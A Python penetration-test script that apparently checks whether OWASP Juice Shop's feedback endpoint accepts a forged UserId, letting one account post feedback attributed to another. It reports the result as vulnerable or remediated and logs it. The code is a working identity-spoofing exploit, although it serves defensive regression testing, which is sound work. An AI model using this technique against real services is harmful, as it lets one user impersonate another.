#!/usr/bin/env python3
"""pt11: feedback can be forged to appear to come from a different account.

POST /api/Feedbacks accepts a client-supplied UserId and trusts it
outright; the authenticated caller's own id is never checked against
it. Confirmed by Juice Shop's own "Forged Feedback" scoreboard entry.

The captcha quirks pt09 documented (field named `captcha`, not
`captchaAnswer`) apply here too; see pt09's PREREGISTRATION.md.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt11-001.json"


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, int]:
    email = f"pt11-{label}-{stamp}@flatline.test"
    password = "Pt11Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    return token, _jwt_payload(token)["data"]["id"]


def _submit_feedback(target: str, token: str, user_id: int, comment: str):
    cap_status, captcha = _request("GET", f"{target}/rest/captcha/")
    return _request(
        "POST", f"{target}/api/Feedbacks", token=token,
        body={"comment": comment, "rating": 1, "UserId": user_id, "captchaId": captcha["captchaId"], "captcha": captcha["answer"]},
    )


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    attacker_token, attacker_id = _register_and_login(target, "attacker", stamp)
    _, victim_id = _register_and_login(target, "victim", stamp)

    # Prime the attacker's token into the authenticatedUsers cache, the
    # same quirk pt01 and pt09 document; this challenge's own solve
    # check depends on it to know the caller's real id.
    _request("GET", f"{target}/rest/user/whoami", token=attacker_token)

    exploit_status, exploit_body = _submit_feedback(target, attacker_token, victim_id, "pt11 forged feedback, claims to be from the victim")
    returned_user_id = exploit_body.get("data", {}).get("UserId")

    if exploit_status in (400, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 201 and returned_user_id == victim_id:
        status = "VULNERABLE"
        summary = f"Attacker (id={attacker_id}) authored feedback attributed to the victim (id={victim_id}) with no identity check."
    elif exploit_status == 201 and returned_user_id == attacker_id:
        # Not blocked, but not forged either: the compensating control
        # silently corrected the claimed identity instead of rejecting
        # the request outright.
        status = "REMEDIATED"
        summary = f"Request succeeded (HTTP 201), but UserId was silently corrected to the real caller's id ({attacker_id}), not the claimed victim ({victim_id})."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, body={exploit_body}."

    legit_status, legit_body = _submit_feedback(target, attacker_token, attacker_id, "pt11 legitimate self-authored feedback")
    legitimate_self_attribution_ok = legit_status == 201 and legit_body.get("data", {}).get("UserId") == attacker_id

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_self_attribution_ok": legitimate_self_attribution_ok,
        "legitimate_self_attribution_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt11-forged-feedback-identity-spoofing", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
